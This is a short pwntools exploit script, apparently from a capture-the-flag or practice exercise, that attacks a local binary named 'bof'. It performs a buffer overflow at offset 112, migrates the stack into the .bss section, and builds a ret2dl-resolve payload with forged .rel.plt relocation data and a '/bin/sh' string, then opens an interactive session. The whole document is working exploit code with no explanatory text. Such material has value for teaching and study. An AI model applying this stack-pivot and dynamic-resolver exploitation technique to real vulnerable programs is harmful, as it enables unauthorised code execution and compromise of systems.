from pwn import *

elf = ELF('bof')
r=process('./bof')
rop=ROP('./bof')

offset=112
bss_addr=elf.bss()

stack_size=0x800
base_stage=bss_addr+stack_size

rop.raw('a'*offset)
rop.read(0,base_stage,100)
rop.migrate(base_stage)
r.sendline(rop.chain())

rop=ROP('./bof')
sh="/bin/sh"
plt0=elf.get_section_by_name('.plt').header.sh_addr
rel_plt=elf.get_section_by_name('.rel.plt').header.sh_addr
index_offset=base_stage+24-rel_plt
write_got=elf.got['write']
r_info=0x607

rop.raw(plt0)
rop.raw(index_offset)
rop.raw('bbbb')
rop.raw(1)
rop.raw(base_stage+80)
rop.raw(len(sh))
rop.raw(write_got)
rop.raw(r_info)
rop.raw('a'*(80-len(rop.chain())))

rop.raw(sh)
rop.raw('a'*(100-len(rop.chain())))

r.sendline(rop.chain())
r.interactive()
